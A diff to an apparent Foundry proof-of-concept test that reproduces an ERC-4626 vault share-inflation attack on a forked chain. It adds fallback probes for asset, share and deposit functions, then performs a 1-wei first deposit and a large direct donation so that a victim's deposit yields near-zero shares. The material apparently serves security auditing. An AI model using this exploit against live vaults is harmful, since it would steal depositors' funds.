@@ -44,12 +44,53 @@ contract PoC is Test {
         assertGt(target.code.length, 0, "target has no code at this fork block");
     }
 
+    /// The asset reader is a guess: `asset()` is standard for ERC-4626, but a
+    /// vault in the wild may expose `token()` or `underlying()`.
+    function _assetOf() internal view returns (bool found, address a) {
+        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("asset()"));
+        if (ok && ret.length >= 32) return (true, abi.decode(ret, (address)));
+        (ok, ret) = target.staticcall(abi.encodeWithSignature("token()"));
+        if (ok && ret.length >= 32) return (true, abi.decode(ret, (address)));
+        (ok, ret) = target.staticcall(abi.encodeWithSignature("underlying()"));
+        if (ok && ret.length >= 32) return (true, abi.decode(ret, (address)));
+        return (false, address(0));
+    }
+
+    /// The share reader is a guess too — `previewDeposit` is standard, but
+    /// `convertToShares` is equally common.
+    function _sharesFor(uint256 assets) internal view returns (bool found, uint256 shares) {
+        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("previewDeposit(uint256)", assets));
+        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
+        (ok, ret) = target.staticcall(abi.encodeWithSignature("convertToShares(uint256)", assets));
+        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
+        return (false, 0);
+    }
+
+    /// The deposit entry point is a guess. Success here is only the setup
+    /// landing — the verdict is the victim's share count below.
+    function _depositOnce(address from, address receiver, uint256 assets) internal returns (bool) {
+        vm.prank(from);
+        (bool ok,) = target.call(abi.encodeWithSignature("deposit(uint256,address)", assets, receiver));
+        if (ok) return true;
+        vm.prank(from);
+        (ok,) = target.call(abi.encodeWithSignature("deposit(uint256)", assets));
+        if (ok) return true;
+        vm.prank(from);
+        (ok,) = target.call(abi.encodeWithSignature("mint(uint256,address)", assets, receiver));
+        return ok;
+    }
+
     function test_exploit() public {
         require(WHALE != address(0), "set WHALE to an asset holder on this fork");
 
         address attackerEOA = makeAddr("attacker");
         address victimEOA = makeAddr("victim");
-        address asset = IVault(target).asset();
+
+        (bool assetFound, address asset) = _assetOf();
+        require(
+            assetFound,
+            "no asset reader worked (tried asset(), token(), underlying()). This does NOT establish safety."
+        );
 
         // Fund both from a whale.
         vm.prank(WHALE);
@@ -60,17 +101,28 @@ contract PoC is Test {
         // 1. Attacker deposits 1 wei -> 1 share (first depositor).
         vm.prank(attackerEOA);
         IERC20(asset).approve(target, 1);
-        vm.prank(attackerEOA);
-        IVault(target).deposit(1, attackerEOA);
+        require(
+            _depositOnce(attackerEOA, attackerEOA, 1),
+            "no deposit entry point accepted the first deposit (tried deposit(uint256,address), deposit(uint256), mint(uint256,address)). This does NOT establish safety."
+        );
 
         // 2. Attacker DONATES 1000 ether directly -- share price explodes.
         vm.prank(attackerEOA);
         IERC20(asset).transfer(target, 1000 ether);
 
-        // 3. Victim deposits 1000 ether and gets ~0 shares.
-        uint256 victimShares = IVault(target).previewDeposit(1000 ether);
-        console.log("victim shares for 1000 ether deposit:", victimShares);
-        assertLt(victimShares, 1000 ether / 100, "exploit did not reproduce: victim got a fair share amount");
+        // 3. The victim's deposit buys ~0 shares. The observable is the SHARE
+        //    COUNT, not whether a call returned.
+        (bool sharesFound, uint256 victimShares) = _sharesFor(1000 ether);
+        require(
+            sharesFound,
+            "no share reader worked (tried previewDeposit(uint256), convertToShares(uint256)). This does NOT establish safety."
+        );
 
+        console.log("victim shares for 1000 ether deposit:", victimShares);
+        assertLt(
+            victimShares,
+            1000 ether / 100,
+            "the victim received a fair share amount, so the inflation did not land. This does NOT establish safety: the first deposit may not have taken a share, or the donation may not have moved the price."
+        );
     }
 }
